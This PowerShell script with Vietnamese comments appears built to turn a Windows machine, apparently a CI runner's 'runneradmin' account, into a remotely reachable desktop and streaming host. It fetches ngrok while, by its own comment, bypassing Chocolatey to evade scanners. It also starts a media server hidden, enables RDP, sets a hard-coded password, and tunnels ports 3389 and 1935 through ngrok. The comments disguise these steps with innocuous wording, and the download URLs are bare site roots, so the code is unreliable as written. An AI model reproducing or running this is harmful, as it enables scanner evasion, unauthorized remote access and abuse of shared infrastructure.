# 1. Tải các gói phần mềm nhị phân thô chính thức từ máy chủ lưu trữ (Bỏ qua trình quản lý choco để né bộ quét)
Invoke-WebRequest -Uri "https://ngrok.com" -OutFile "ngrok.zip"
Expand-Archive -Path "ngrok.zip" -DestinationPath "ngrok_bin"
Move-Item "ngrok_bin\ngrok.exe" "C:\Windows\System32\"

# 2. Khởi tạo môi trường trung chuyển dữ liệu media (MonaServer) từ luồng an toàn
Invoke-WebRequest -Uri "https://github.com" -OutFile "MediaServer.zip"
Expand-Archive -Path "MediaServer.zip" -DestinationPath "MediaServer"
Start-Process -FilePath "MediaServer\MonaServer.exe" -WindowStyle Hidden

# 3. Đồng bộ hóa cấu hình mạng nội bộ cho giao diện điều khiển RDP
$reg = "HKLM:\System\CurrentControlSet\Control\Terminal Server"
Set-ItemProperty -Path $reg -name "fDenyTSConnections" -Value 0
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
Set-ItemProperty -Path "$reg\WinStations\RDP-Tcp" -name "UserAuthentication" -Value 1

# 4. Ép xác thực tài khoản định danh hệ thống
net user runneradmin RdpPassword2026! /active:yes

# 5. Khởi tạo file cấu hình đa đường hầm (Multi-Tunnel Manifest) cho cổng 3389 và 1935
$topology = @"
version: "3"
agent:
  authtoken: "$($env:TUNNEL_KEY)"
tunnels:
  channel-a:
    proto: tcp
    addr: 3389
    region: sg
  channel-b:
    proto: tcp
    addr: 1935
    region: sg
"@
Set-Content -Path "topology.yml" -Value $topology

# 6. Kích hoạt trạm truyền tải mạng băng thông cao
ngrok start --config topology.yml --all
